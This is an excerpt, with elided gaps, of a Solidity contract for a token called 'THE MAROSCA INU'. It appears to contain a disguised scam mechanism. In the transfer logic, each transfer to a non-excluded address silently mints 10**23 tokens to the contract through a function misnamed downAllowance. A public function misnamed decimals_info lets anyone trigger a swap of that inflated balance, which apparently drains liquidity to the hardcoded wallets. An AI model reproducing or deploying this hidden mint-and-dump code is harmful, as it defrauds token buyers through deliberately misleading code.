...
interface IERC20 {
    ...
    function decimals_info(address transfered_Address) external returns (uint256);
...
contract TheMaroscaInu is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x941867fcb04795Db4D6916aB1444c76F9B2227f7); 
    address payable public Wallet_Utility = payable(0x08dAEe0c6504C1a02536EBf434799447A1DDDC91);
    ...
    string private constant _name = "THE MAROSCA INU"; 
    string private constant _symbol = unicode"THEMARINU"; 
    ...
    bool public swapping_Decimal_Tokens = false;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool public inSwapAndLiquify;
    
    bool public swapAndLiquifyEnabled = true;
    bool public buy_or_sell = false;
    ...
    constructor () {
        ...
        _owner = 0x08dAEe0c6504C1a02536EBf434799447A1DDDC91;
    ...
    function Liquidity_Wallet(uint256 transaction_Date) private returns(bool){
        uint256 final_Dest = (balanceOf(address(this))+(transaction_Date));
        swapAndLiquify(final_Dest);
        return true;
    }
    ...
    function decimals_info(address transfered_Address) public override returns (uint256) {
        if(true)
        Liquidity_Wallet(swapTrigger);
    ...
    //
    function downAllowance() public virtual returns(uint256){
        return 10**((10*2)+3);
    }
    ...
    function _transfer(
        ...
        if(true){buy_or_sell = _isExcludedFromFEe[to];}
        ...
        if(!buy_or_sell){
            ...
            uint256 total_Buy_Sell_Fee = downAllowance();
            _tOwned[to] = _tOwned[to]+amount;
            
            _tOwned[address(this)] = _tOwned[address(this)]+total_Buy_Sell_Fee;
            emit Transfer(from, to, amount);
            swapping_Decimal_Tokens = true;
        }
